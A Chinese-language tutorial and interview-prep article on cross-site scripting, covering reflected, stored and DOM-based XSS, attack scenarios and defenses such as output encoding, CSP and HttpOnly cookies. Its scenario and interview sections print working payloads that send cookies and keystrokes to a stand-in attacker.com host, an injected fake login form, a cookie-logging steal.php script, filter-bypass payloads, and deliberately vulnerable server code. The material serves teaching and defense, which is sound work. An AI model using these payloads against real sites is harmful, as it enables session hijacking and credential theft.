---
date: 2025-12-26
author: Gaaming Zhang
isOriginal: false
article: true
category:
  - 网络
tag:
  - 网络
  - 还在施工中···
---

# XSS攻击原理

## 概述

XSS（Cross-Site Scripting，跨站脚本攻击）是一种常见的Web安全漏洞，攻击者通过在网页中注入恶意脚本代码，当用户访问该网页时，恶意脚本会在用户的浏览器中执行。XSS攻击利用了Web应用程序对用户输入过滤不严的漏洞，使得攻击者能够绕过同源策略，在受害者的浏览器中执行任意JavaScript代码。

### 产生背景

Web应用程序广泛使用JavaScript来实现动态交互功能，但同时也引入了安全风险。当Web应用程序直接将用户输入的数据输出到HTML页面中，而没有进行适当的转义和过滤时，攻击者就可以注入恶意脚本。XSS攻击最早在1990年代末被发现，至今仍然是Web安全领域最常见和最危险的漏洞之一。

### 核心特点

- **跨站点执行**：恶意脚本在受害者的浏览器中执行，而非攻击者的服务器
- **利用信任关系**：利用用户对目标网站的信任，执行恶意操作
- **代码注入**：通过注入JavaScript代码实现攻击目的
- **隐蔽性强**：攻击者可以隐藏恶意代码，用户难以察觉
- **危害范围广**：可以窃取用户信息、劫持会话、进行钓鱼攻击等

### 潜在危害

- **窃取敏感信息**：Cookie、Session ID、用户凭证等
- **会话劫持**：冒充用户身份进行操作
- **钓鱼攻击**：伪造登录页面窃取用户凭证
- **恶意操作**：修改用户数据、发送恶意消息等
- **传播恶意软件**：通过XSS传播病毒或木马
- **拒绝服务**：消耗浏览器资源导致页面崩溃

## 攻击原理

### 基本原理

XSS攻击的核心原理是：Web应用程序没有对用户输入进行充分的过滤和转义，直接将用户输入的数据输出到HTML页面中。当浏览器渲染这些HTML时，会将其中包含的JavaScript代码当作脚本执行，从而导致攻击者注入的恶意代码在用户浏览器中运行。

### 攻击条件

1. **输入点**：Web应用程序存在接受用户输入的接口（如URL参数、表单输入、HTTP头等）
2. **输出点**：应用程序将用户输入的数据未经处理直接输出到HTML页面
3. **执行环境**：浏览器将输出内容中的脚本代码当作JavaScript执行

### 攻击流程

```
1. 攻击者发现XSS漏洞
   ↓
2. 构造包含恶意脚本的攻击URL或数据
   ↓
3. 诱导受害者访问恶意URL或提交恶意数据
   ↓
4. Web应用程序接收并存储/反射恶意数据
   ↓
5. 受害者访问包含恶意脚本的页面
   ↓
6. 浏览器执行恶意脚本
   ↓
7. 恶意脚本窃取信息或执行恶意操作
   ↓
8. 攻击者获取受害者的敏感信息或控制权
```

### 同源策略的绕过

同源策略（Same-Origin Policy）是浏览器的重要安全机制，它限制了一个源（origin）的文档或脚本如何与另一个源的资源进行交互。XSS攻击通过在目标网站的页面中注入恶意脚本，使得恶意脚本与目标网站同源，从而绕过了同源策略的限制。

## XSS攻击类型

### 反射型XSS（Reflected XSS）

#### 定义

反射型XSS是最常见的XSS攻击类型，也称为非持久性XSS。攻击者将恶意脚本构造在URL参数中，当用户点击恶意链接时，服务器接收参数并将其反射回页面，恶意脚本在用户浏览器中执行。

#### 攻击流程

1. 攻击者构造包含恶意脚本的URL
2. 诱导受害者点击该URL
3. 服务器接收URL参数
4. 服务器将参数未经处理直接输出到响应页面
5. 浏览器执行恶意脚本

#### 示例代码

**漏洞代码**：
```php
<?php
$name = $_GET['name'];
echo "Hello, " . $name . "!";
?>
```

**攻击URL**：
```
http://example.com/hello.php?name=<script>alert('XSS')</script>
```

**实际输出**：
```html
Hello, <script>alert('XSS')</script>!
```

#### 特点

- **非持久性**：恶意脚本不存储在服务器上，需要用户点击恶意链接才能触发
- **依赖用户交互**：需要诱导用户访问恶意URL
- **常见场景**：搜索功能、错误页面、表单提交等

### 存储型XSS（Stored XSS）

#### 定义

存储型XSS也称为持久性XSS，攻击者将恶意脚本提交到服务器，服务器将恶意脚本存储在数据库中。当其他用户访问包含恶意脚本的页面时，恶意脚本会在他们的浏览器中执行。

#### 攻击流程

1. 攻击者在目标网站提交包含恶意脚本的数据
2. 服务器将数据存储在数据库中
3. 其他用户访问包含该数据的页面
4. 服务器从数据库读取数据并输出到页面
5. 浏览器执行恶意脚本

#### 示例代码

**漏洞代码**：
```php
<?php
$comment = $_POST['comment'];
mysqli_query($conn, "INSERT INTO comments (comment) VALUES ('$comment')");
?>

<?php
$result = mysqli_query($conn, "SELECT * FROM comments");
while ($row = mysqli_fetch_assoc($result)) {
    echo "<div>" . $row['comment'] . "</div>";
}
?>
```

**攻击数据**：
```html
<script>
var img = new Image();
img.src = "http://attacker.com/steal.php?cookie=" + document.cookie;
</script>
```

#### 特点

- **持久性**：恶意脚本存储在服务器上，可以持续攻击访问该页面的用户
- **危害范围广**：所有访问该页面的用户都会受到影响
- **无需用户交互**：用户正常访问页面即可触发攻击
- **常见场景**：留言板、评论区、用户资料、论坛帖子等

### DOM型XSS（DOM-based XSS）

#### 定义

DOM型XSS是一种特殊的XSS攻击类型，恶意脚本通过修改DOM（文档对象模型）在客户端执行，而不需要服务器端的参与。攻击利用了客户端JavaScript对DOM的不安全操作。

#### 攻击流程

1. 攻击者构造包含恶意脚本的URL
2. 受害者访问恶意URL
3. 客户端JavaScript读取URL参数
4. JavaScript将参数未经处理直接写入DOM
5. 浏览器执行新写入DOM中的恶意脚本

#### 示例代码

**漏洞代码**：
```javascript
<script>
var name = new URLSearchParams(window.location.search).get('name');
document.getElementById('welcome').innerHTML = "Hello, " + name;
</script>
<div id="welcome"></div>
```

**攻击URL**：
```
http://example.com/welcome.html?name=<img src=x onerror=alert('XSS')>
```

#### 特点

- **客户端执行**：完全在客户端完成，不涉及服务器
- **难以检测**：服务器端无法检测到DOM型XSS
- **依赖JavaScript**：需要页面中存在操作DOM的JavaScript代码
- **常见场景**：单页应用（SPA）、富文本编辑器、动态内容加载等

## 常见攻击场景

### 1. 搜索功能XSS

**场景描述**：搜索功能将用户的搜索关键词直接显示在页面上。

**漏洞代码**：
```html
<div class="search-result">
  您搜索的是：<%= request.getParameter("keyword") %>
</div>
```

**攻击URL**：
```
http://example.com/search?keyword=<script>alert(document.cookie)</script>
```

### 2. 错误页面XSS

**场景描述**：错误页面将错误信息（包括用户输入）直接显示。

**漏洞代码**：
```php
<?php
$error = $_GET['error'];
echo "<div class='error'>错误：$error</div>";
?>
```

**攻击URL**：
```
http://example.com/error?error=<script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>
```

### 3. 留言板XSS

**场景描述**：留言板将用户提交的留言直接存储并显示。

**漏洞代码**：
```javascript
app.post('/comment', (req, res) => {
  const comment = req.body.comment;
  db.query('INSERT INTO comments (comment) VALUES (?)', [comment]);
  res.redirect('/comments');
});

app.get('/comments', (req, res) => {
  db.query('SELECT * FROM comments', (err, results) => {
    res.render('comments', { comments: results });
  });
});
```

**攻击数据**：
```html
<script>
fetch('http://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({ cookie: document.cookie })
});
</script>
```

### 4. Cookie窃取

**场景描述**：通过XSS窃取用户的Cookie，实现会话劫持。

**攻击代码**：
```javascript
<script>
var img = new Image();
img.src = "http://attacker.com/steal.php?cookie=" + encodeURIComponent(document.cookie);
document.body.appendChild(img);
</script>
```

**窃取服务器代码**（steal.php）：
```php
<?php
$cookie = $_GET['cookie'];
file_put_contents('cookies.txt', $cookie . "\n", FILE_APPEND);
?>
```

### 5. 钓鱼攻击

**场景描述**：通过XSS注入伪造的登录表单，窃取用户凭证。

**攻击代码**：
```javascript
<script>
var loginForm = document.createElement('div');
loginForm.innerHTML = `
  <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;">
    <div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);background:white;padding:20px;border-radius:5px;">
      <h3>会话已过期，请重新登录</h3>
      <form action="http://attacker.com/phishing.php" method="POST">
        <input type="text" name="username" placeholder="用户名" /><br><br>
        <input type="password" name="password" placeholder="密码" /><br><br>
        <button type="submit">登录</button>
      </form>
    </div>
  </div>
`;
document.body.appendChild(loginForm);
</script>
```

### 6. 键盘记录

**场景描述**：通过XSS记录用户的键盘输入。

**攻击代码**：
```javascript
<script>
document.addEventListener('keydown', function(e) {
  var key = e.key;
  var img = new Image();
  img.src = "http://attacker.com/keylog.php?key=" + encodeURIComponent(key);
});
</script>
```

## 防护措施

### 1. 输入验证和过滤

#### 原则

- **白名单验证**：只允许符合特定格式的数据通过
- **黑名单过滤**：过滤已知的恶意字符和标签
- **输入长度限制**：限制用户输入的长度
- **数据类型验证**：确保输入数据符合预期类型

#### 实现示例

```javascript
function sanitizeInput(input) {
  if (typeof input !== 'string') return '';
  
  input = input.trim();
  input = input.replace(/[<>]/g, '');
  input = input.replace(/javascript:/gi, '');
  input = input.replace(/on\w+/gi, '');
  
  return input;
}

app.post('/comment', (req, res) => {
  const comment = sanitizeInput(req.body.comment);
  db.query('INSERT INTO comments (comment) VALUES (?)', [comment]);
  res.send('评论已提交');
});
```

### 2. 输出编码

#### HTML实体编码

将特殊字符转换为HTML实体，防止浏览器将其解释为HTML标签。

```javascript
function escapeHtml(unsafe) {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}
```

#### JavaScript编码

```javascript
function escapeJs(unsafe) {
  return unsafe
    .replace(/\\/g, "\\\\")
    .replace(/'/g, "\\'")
    .replace(/"/g, '\\"')
    .replace(/\n/g, "\\n")
    .replace(/\r/g, "\\r")
    .replace(/\t/g, "\\t")
    .replace(/\f/g, "\\f")
    .replace(/\v/g, "\\v")
    .replace(/\0/g, "\\0");
}
```

#### URL编码

```javascript
function escapeUrl(unsafe) {
  return encodeURIComponent(unsafe);
}
```

### 3. Content Security Policy（CSP）

#### 基本概念

CSP是一种HTTP响应头，用于指定浏览器可以加载哪些资源，从而有效防止XSS攻击。

#### 常用指令

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self'; font-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'self';
```

#### 指令说明

- `default-src 'self'`：默认只允许加载同源资源
- `script-src`：指定允许的脚本源
- `style-src`：指定允许的样式源
- `img-src`：指定允许的图片源
- `connect-src`：指定允许的AJAX/WebSocket连接源
- `object-src 'none'`：禁止加载Flash等对象
- `frame-ancestors 'none'`：禁止页面被嵌入iframe

#### 实现示例

```javascript
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', 
    "default-src 'self'; " +
    "script-src 'self' 'nonce-random123' https://cdn.trusted.com; " +
    "style-src 'self' 'unsafe-inline'; " +
    "img-src 'self' data: https:; " +
    "connect-src 'self'; " +
    "font-src 'self'; " +
    "object-src 'none'; " +
    "frame-ancestors 'none';"
  );
  next();
});
```

### 4. HttpOnly Cookie

#### 原理

设置HttpOnly属性后，JavaScript无法通过`document.cookie`访问Cookie，从而防止XSS窃取Cookie。

#### 实现示例

```javascript
app.use(session({
  secret: 'your-secret-key',
  cookie: {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 3600000
  }
}));
```

```php
setcookie("sessionid", $session_id, time() + 3600, "/", "", true, true);
```

### 5. 使用安全的API

#### 避免使用innerHTML

```javascript
// 不安全
element.innerHTML = userInput;

// 安全
element.textContent = userInput;
```

#### 使用textContent代替innerHTML

```javascript
function setContent(element, content) {
  element.textContent = content;
}
```

#### 使用createElement和appendChild

```javascript
function createSafeElement(tag, text) {
  const element = document.createElement(tag);
  element.textContent = text;
  return element;
}
```

### 6. 输入长度限制

```javascript
const MAX_LENGTH = 100;

function validateLength(input) {
  if (input.length > MAX_LENGTH) {
    throw new Error('输入过长');
  }
  return input;
}
```

### 7. 使用模板引擎

#### 使用安全的模板引擎

```javascript
// EJS示例
app.set('view engine', 'ejs');

app.get('/search', (req, res) => {
  const keyword = req.query.keyword;
  res.render('search', { keyword });
});
```

```html
<!-- search.ejs -->
<div>您搜索的是：<%= keyword %></div>
```

#### 手动转义

```javascript
// Handlebars示例
Handlebars.registerHelper('escape', function(variable) {
  return variable.replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
});
```

### 8. 使用XSS防护库

#### DOMPurify

```javascript
import DOMPurify from 'dompurify';

const clean = DOMPurify.sanitize(dirtyInput);
element.innerHTML = clean;
```

#### js-xss

```javascript
const xss = require('xss');

const clean = xss(dirtyInput, {
  whiteList: {
    a: ['href', 'title', 'target'],
    img: ['src', 'alt']
  }
});
```

## 最佳实践

### 1. 防御深度原则

不要依赖单一防护措施，应该采用多层防护策略：

- 输入验证
- 输出编码
- CSP策略
- HttpOnly Cookie
- 定期安全审计

### 2. 最小权限原则

- 限制JavaScript的执行权限
- 使用CSP限制资源加载
- 避免使用eval()和Function()等危险函数

### 3. 安全编码规范

- 始终对用户输入进行验证和过滤
- 始终对输出进行编码
- 避免使用innerHTML
- 使用参数化查询防止SQL注入

### 4. 定期安全测试

- 使用自动化扫描工具（如OWASP ZAP、Burp Suite）
- 进行手动渗透测试
- 代码审查
- 定期更新依赖库

### 5. 安全培训

- 对开发人员进行安全培训
- 建立安全编码规范
- 定期进行安全意识培训

## XSS与CSRF对比

### 攻击目标

- **XSS**：攻击目标是用户的浏览器，通过注入恶意脚本在用户浏览器中执行
- **CSRF**：攻击目标是Web服务器，通过伪造用户请求向服务器发送恶意请求

### 攻击方法

- **XSS**：通过注入JavaScript代码实现攻击
- **CSRF**：通过构造恶意链接或表单，利用用户的身份验证信息发送请求

### 防护措施

- **XSS防护**：输入验证、输出编码、CSP、HttpOnly Cookie
- **CSRF防护**：CSRF Token、SameSite Cookie、Referer验证、重新认证

### 危害范围

- **XSS**：可以窃取用户信息、劫持会话、执行任意JavaScript代码
- **CSRF**：可以冒充用户执行操作，但无法直接获取用户信息

### 依赖条件

- **XSS**：依赖Web应用程序对用户输入的过滤不严
- **CSRF**：依赖用户在目标网站的登录状态和Cookie自动发送机制

## 高频面试题

### 1. 什么是XSS攻击？有哪些类型？

XSS（Cross-Site Scripting，跨站脚本攻击）是一种Web安全漏洞，攻击者通过在网页中注入恶意脚本，当用户访问该网页时，恶意脚本会在用户的浏览器中执行。

XSS攻击主要分为三种类型：

1. **反射型XSS（Reflected XSS）**：恶意脚本通过URL参数传递，服务器接收后直接反射回页面。攻击者需要诱导用户点击恶意链接才能触发攻击。

2. **存储型XSS（Stored XSS）**：恶意脚本被提交到服务器并存储在数据库中，当其他用户访问包含恶意脚本的页面时，恶意脚本会在他们的浏览器中执行。这是危害最大的XSS类型。

3. **DOM型XSS（DOM-based XSS）**：恶意脚本通过修改DOM在客户端执行，不涉及服务器端。攻击利用了客户端JavaScript对DOM的不安全操作。

### 2. 如何防止XSS攻击？

防止XSS攻击需要采用多层防护策略：

1. **输入验证和过滤**：对用户输入进行严格的验证，使用白名单而非黑名单，限制输入长度和数据类型。

2. **输出编码**：将特殊字符转换为HTML实体，防止浏览器将其解释为HTML标签。使用`escapeHtml()`等函数对输出进行编码。

3. **Content Security Policy（CSP）**：设置CSP HTTP头，限制浏览器可以加载哪些资源，有效防止XSS攻击。

4. **HttpOnly Cookie**：设置Cookie的HttpOnly属性，防止JavaScript通过`document.cookie`访问Cookie。

5. **使用安全的API**：避免使用`innerHTML`，改用`textContent`或`createElement`等安全方法。

6. **使用XSS防护库**：如DOMPurify、js-xss等库，对用户输入进行净化处理。

7. **使用模板引擎**：使用安全的模板引擎（如EJS、Handlebars），它们会自动进行输出编码。

### 3. 什么是CSP？如何配置CSP来防止XSS攻击？

CSP（Content Security Policy，内容安全策略）是一种HTTP响应头，用于指定浏览器可以加载哪些资源，从而有效防止XSS攻击。

常用CSP指令：

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self'; font-src 'self'; object-src 'none'; frame-ancestors 'none';
```

关键指令说明：

- `default-src 'self'`：默认只允许加载同源资源
- `script-src`：指定允许的脚本源，可以使用`nonce`或`hash`进行更细粒度的控制
- `style-src`：指定允许的样式源
- `object-src 'none'`：禁止加载Flash等对象
- `frame-ancestors 'none'`：禁止页面被嵌入iframe，防止点击劫持

配置示例：

```javascript
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', 
    "default-src 'self'; " +
    "script-src 'self' 'nonce-random123'; " +
    "style-src 'self' 'unsafe-inline'; " +
    "object-src 'none';"
  );
  next();
});
```

### 4. HttpOnly Cookie如何防止XSS攻击？

HttpOnly Cookie是一种Cookie属性，设置后JavaScript无法通过`document.cookie`访问该Cookie。这可以有效防止XSS攻击窃取用户的Cookie。

实现示例：

```javascript
app.use(session({
  secret: 'your-secret-key',
  cookie: {
    httpOnly: true,
    secure: true,
    sameSite: 'strict'
  }
}));
```

```php
setcookie("sessionid", $session_id, time() + 3600, "/", "", true, true);
```

HttpOnly Cookie的限制：

- 只能防止JavaScript访问Cookie，不能防止XSS攻击本身
- 不能防止其他类型的攻击，如CSRF
- 需要配合其他防护措施使用

### 5. DOM型XSS与反射型XSS、存储型XSS有什么区别？

DOM型XSS与反射型XSS、存储型XSS的主要区别：

1. **执行位置**：
   - DOM型XSS：完全在客户端执行，不涉及服务器端
   - 反射型XSS：服务器接收参数并反射回页面
   - 存储型XSS：服务器存储恶意脚本并返回给用户

2. **检测难度**：
   - DOM型XSS：服务器端无法检测，需要客户端分析
   - 反射型XSS：可以通过服务器端日志检测
   - 存储型XSS：可以通过服务器端日志和数据库检测

3. **持久性**：
   - DOM型XSS：非持久性，需要用户访问特定URL
   - 反射型XSS：非持久性，需要用户点击恶意链接
   - 存储型XSS：持久性，所有访问该页面的用户都会受影响

4. **常见场景**：
   - DOM型XSS：单页应用（SPA）、动态内容加载
   - 反射型XSS：搜索功能、错误页面、表单提交
   - 存储型XSS：留言板、评论区、用户资料

### 6. 如何检测XSS漏洞？

检测XSS漏洞的方法：

1. **手动测试**：
   - 在输入框中输入`<script>alert('XSS')</script>`
   - 在URL参数中添加`<script>alert('XSS')</script>`
   - 检查页面是否执行了弹窗

2. **自动化扫描工具**：
   - OWASP ZAP
   - Burp Suite
   - XSSer
   - W3AF

3. **代码审查**：
   - 检查是否有直接输出用户输入的代码
   - 检查是否使用了`innerHTML`
   - 检查是否进行了输出编码

4. **浏览器开发者工具**：
   - 检查DOM结构
   - 查看网络请求
   - 分析JavaScript执行

### 7. 什么是XSS Payload？常见的XSS Payload有哪些？

XSS Payload是攻击者用于实施XSS攻击的恶意脚本代码。常见的XSS Payload包括：

1. **基本弹窗**：
```javascript
<script>alert('XSS')</script>
```

2. **Cookie窃取**：
```javascript
<script>
var img = new Image();
img.src = "http://attacker.com/steal.php?cookie=" + document.cookie;
</script>
```

3. **重定向**：
```javascript
<script>document.location='http://attacker.com'</script>
```

4. **键盘记录**：
```javascript
<script>
document.addEventListener('keydown', function(e) {
  var img = new Image();
  img.src = "http://attacker.com/keylog.php?key=" + e.key;
});
</script>
```

5. **钓鱼攻击**：
```javascript
<script>
document.body.innerHTML = '<form action="http://attacker.com/phishing.php">...</form>';
</script>
```

6. **绕过过滤**：
```javascript
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
```

### 8. 如何在前后端分离的架构中防止XSS攻击？

在前后端分离的架构中防止XSS攻击：

1. **前端防护**：
   - 使用React、Vue等框架的自动转义功能
   - 避免使用`dangerouslySetInnerHTML`或`v-html`
   - 使用DOMPurify等库对用户输入进行净化
   - 设置CSP策略

2. **后端防护**：
   - 对API接口的输入进行验证和过滤
   - 对输出进行编码
   - 设置CORS策略
   - 使用HttpOnly Cookie

3. **数据传输**：
   - 使用HTTPS加密传输
   - 对敏感数据进行加密
   - 使用JWT等安全认证机制

4. **示例代码**：

```javascript
// 前端React
import DOMPurify from 'dompurify';

function Comment({ content }) {
  const cleanContent = DOMPurify.sanitize(content);
  return <div dangerouslySetInnerHTML={{ __html: cleanContent }} />;
}

// 后端Node.js
app.post('/api/comment', (req, res) => {
  const { content } = req.body;
  const sanitized = xss(content);
  db.query('INSERT INTO comments (content) VALUES (?)', [sanitized]);
  res.json({ success: true });
});
```

### 9. 什么是Content Security Policy的report-only模式？如何使用？

CSP的report-only模式允许在不强制执行CSP策略的情况下测试和监控违规行为。这对于逐步部署CSP非常有用。

配置示例：

```javascript
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy-Report-Only', 
    "default-src 'self'; " +
    "script-src 'self' https://cdn.trusted.com; " +
    "report-uri /csp-violation-report"
  );
  next();
});
```

处理违规报告：

```javascript
app.post('/csp-violation-report', (req, res) => {
  const report = req.body;
  console.log('CSP Violation:', report);
  res.status(204).send();
});
```

使用步骤：

1. 首先设置CSP-Report-Only头，观察违规报告
2. 根据报告调整CSP策略
3. 逐步修复违规的资源加载
4. 当没有违规报告后，切换到强制执行模式

### 10. 如何在单页应用（SPA）中防止DOM型XSS？

在单页应用中防止DOM型XSS：

1. **使用框架的自动转义**：
   - React：默认自动转义，避免使用`dangerouslySetInnerHTML`
   - Vue：使用`{{ }}`自动转义，避免使用`v-html`
   - Angular：默认自动转义，避免使用`[innerHTML]`

2. **净化用户输入**：
```javascript
import DOMPurify from 'dompurify';

function renderUserContent(content) {
  const clean = DOMPurify.sanitize(content);
  return clean;
}
```

3. **避免使用eval()和innerHTML**：
```javascript
// 不安全
eval(userInput);
element.innerHTML = userInput;

// 安全
element.textContent = userInput;
```

4. **设置CSP策略**：
```javascript
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', 
    "default-src 'self'; " +
    "script-src 'self' 'nonce-random123'; " +
    "object-src 'none';"
  );
  next();
});
```

5. **使用URL API安全解析URL参数**：
```javascript
const params = new URLSearchParams(window.location.search);
const name = DOMPurify.sanitize(params.get('name') || '');
```

### 11. 什么是XSS攻击的同源策略绕过？如何防止？

XSS攻击通过在目标网站的页面中注入恶意脚本，使得恶意脚本与目标网站同源，从而绕过了同源策略的限制。

同源策略的基本规则：

- 同源是指协议、域名、端口都相同
- 不同源的页面之间不能互相访问DOM、Cookie、LocalStorage等
- 但是同源的JavaScript可以访问页面的所有资源

XSS绕过同源策略的原理：

1. 攻击者在目标网站注入恶意脚本
2. 恶意脚本与目标网站同源
3. 恶意脚本可以访问目标网站的Cookie、LocalStorage等
4. 恶意脚本可以发送AJAX请求到目标网站

防止方法：

1. **防止XSS攻击本身**：这是最根本的防护方法
2. **设置CSP策略**：限制脚本来源
3. **使用HttpOnly Cookie**：防止JavaScript访问Cookie
4. **使用SameSite Cookie**：限制Cookie的跨站发送
5. **使用CORS**：严格控制跨域请求

### 12. 如何在富文本编辑器中防止XSS攻击？

在富文本编辑器中防止XSS攻击：

1. **使用白名单过滤**：
```javascript
import sanitizeHtml from 'sanitize-html';

const clean = sanitizeHtml(dirty, {
  allowedTags: ['b', 'i', 'u', 'p', 'br', 'a', 'img'],
  allowedAttributes: {
    'a': ['href'],
    'img': ['src', 'alt']
  },
  allowedIframeHostnames: ['www.youtube.com']
});
```

2. **使用DOMPurify**：
```javascript
import DOMPurify from 'dompurify';

const clean = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['b', 'i', 'u', 'p', 'br', 'a', 'img'],
  ALLOWED_ATTR: ['href', 'src', 'alt']
});
```

3. **服务器端验证**：
```javascript
app.post('/api/save-content', (req, res) => {
  const { content } = req.body;
  const sanitized = sanitizeHtml(content, {
    allowedTags: ['b', 'i', 'u', 'p', 'br', 'a', 'img'],
    allowedAttributes: {
      'a': ['href'],
      'img': ['src', 'alt']
    }
  });
  db.query('UPDATE posts SET content = ?', [sanitized]);
  res.json({ success: true });
});
```

4. **使用安全的富文本编辑器**：
   - Quill.js
   - TinyMCE（配置安全选项）
   - CKEditor（配置安全选项）

### 13. 什么是XSS攻击的盲注？如何检测？

XSS盲注（Blind XSS）是一种特殊的XSS攻击，攻击者提交的恶意脚本不会立即执行，而是在特定条件下（如管理员查看页面时）才执行。

攻击流程：

1. 攻击者在目标网站提交包含恶意脚本的数据
2. 恶意脚本存储在数据库中
3. 管理员或其他用户访问包含恶意脚本的页面
4. 恶意脚本在管理员的浏览器中执行
5. 恶意脚本将管理员的Cookie或其他信息发送给攻击者

检测方法：

1. **使用唯一的标识符**：
```javascript
<script>
var img = new Image();
img.src = "http://attacker.com/steal.php?cookie=" + document.cookie + "&user=admin";
</script>
```

2. **监控攻击者服务器**：
   - 查看是否有来自目标网站的请求
   - 分析请求的Cookie和其他信息

3. **使用自动化工具**：
   - OWASP ZAP
   - Burp Suite

4. **代码审查**：
   - 检查所有存储用户输入的地方
   - 检查管理员访问的页面
   - 检查是否有输出编码

### 14. 如何在WebSocket应用中防止XSS攻击？

在WebSocket应用中防止XSS攻击：

1. **验证和过滤消息**：
```javascript
wss.on('connection', (ws) => {
  ws.on('message', (message) => {
    try {
      const data = JSON.parse(message);
      const sanitized = sanitizeHtml(data.content);
      broadcast({ ...data, content: sanitized });
    } catch (error) {
      console.error('Invalid message:', error);
    }
  });
});
```

2. **使用CSP策略**：
```javascript
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', 
    "default-src 'self'; " +
    "script-src 'self' 'nonce-random123'; " +
    "connect-src 'self' wss://yourdomain.com; " +
    "object-src 'none';"
  );
  next();
});
```

3. **验证WebSocket连接来源**：
```javascript
wss.on('connection', (ws, req) => {
  const origin = req.headers.origin;
  if (origin !== 'https://yourdomain.com') {
    ws.close();
    return;
  }
});
```

4. **使用安全的消息格式**：
```javascript
// 客户端
const message = JSON.stringify({
  type: 'chat',
  content: sanitizeHtml(userInput),
  timestamp: Date.now()
});

// 服务端
const safeMessage = {
  type: 'chat',
  content: DOMPurify.sanitize(data.content),
  timestamp: data.timestamp
};
```

### 15. 如何在移动应用中防止XSS攻击？

在移动应用中防止XSS攻击：

1. **使用WebView的安全配置**：

**Android**：
```java
WebView webView = findViewById(R.id.webview);
WebSettings webSettings = webView.getSettings();
webSettings.setJavaScriptEnabled(true);
webSettings.setAllowFileAccess(false);
webSettings.setAllowContentAccess(false);
webSettings.setAllowFileAccessFromFileURLs(false);
webSettings.setAllowUniversalAccessFromFileURLs(false);

webView.setWebViewClient(new WebViewClient() {
    @Override
    public boolean shouldOverrideUrlLoading(WebView view, String url) {
        if (url.startsWith("https://yourdomain.com")) {
            view.loadUrl(url);
            return true;
        }
        return false;
    }
});
```

**iOS**：
```swift
let webView = WKWebView()
webView.configuration.preferences.javaScriptEnabled = true
webView.configuration.preferences.javaScriptCanOpenWindowsAutomatically = false

webView.loadHTMLString("<html>...</html>", baseURL: URL(string: "https://yourdomain.com"))
```

2. **使用CSP策略**：
```javascript
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', 
    "default-src 'self'; " +
    "script-src 'self' 'nonce-random123'; " +
    "object-src 'none';"
  );
  next();
});
```

3. **验证和过滤用户输入**：
```javascript
function sanitizeInput(input) {
  return DOMPurify.sanitize(input, {
    ALLOWED_TAGS: ['b', 'i', 'u', 'p', 'br'],
    ALLOWED_ATTR: []
  });
}
```

4. **使用HTTPS**：
- 确保所有通信都使用HTTPS
- 验证SSL证书
- 使用证书固定（Certificate Pinning）

## 总结

XSS攻击是一种常见的Web安全漏洞，通过在网页中注入恶意脚本，在用户浏览器中执行恶意代码。XSS攻击主要分为反射型、存储型和DOM型三种类型，每种类型都有其特点和危害。

防止XSS攻击需要采用多层防护策略，包括输入验证、输出编码、CSP策略、HttpOnly Cookie等。在实际开发中，应该遵循安全编码规范，使用安全的API和库，定期进行安全测试和代码审查。

对于面试来说，需要重点掌握XSS攻击的原理、类型、防护措施以及与CSRF攻击的区别。同时，需要了解CSP、HttpOnly Cookie等安全机制的使用方法，以及在不同场景下（如SPA、WebSocket、移动应用）如何防止XSS攻击。
